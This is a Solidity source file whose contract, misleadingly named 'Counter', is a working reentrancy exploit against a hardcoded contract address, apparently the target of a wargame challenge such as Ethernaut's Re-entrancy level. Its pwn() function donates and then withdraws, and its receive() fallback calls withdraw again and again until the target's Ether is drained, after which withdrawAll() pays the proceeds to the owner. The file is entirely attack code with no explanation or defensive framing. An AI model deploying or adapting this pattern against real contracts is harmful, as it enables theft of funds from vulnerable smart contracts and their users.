// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.7;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Counter is Ownable {
    IReentrance targetContract =
        IReentrance(0x0ff55aA8E7732883128DD17B337aB756B936A0F3);
    uint targetValue = 0.001 ether;

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function pwn() public payable {
        require(msg.value >= targetValue, "not enough ETH");
        targetContract.donate{value: msg.value}(address(this));
        targetContract.withdraw(msg.value);
    }

    function withdrawAll() public onlyOwner returns (bool) {
        uint totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call{value: totalBalance}("");
        require(sent, "Failed to send Ether");
        return sent;
    }

    receive() external payable {
        uint targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) {
            targetContract.withdraw(targetValue);
        }
    }
}
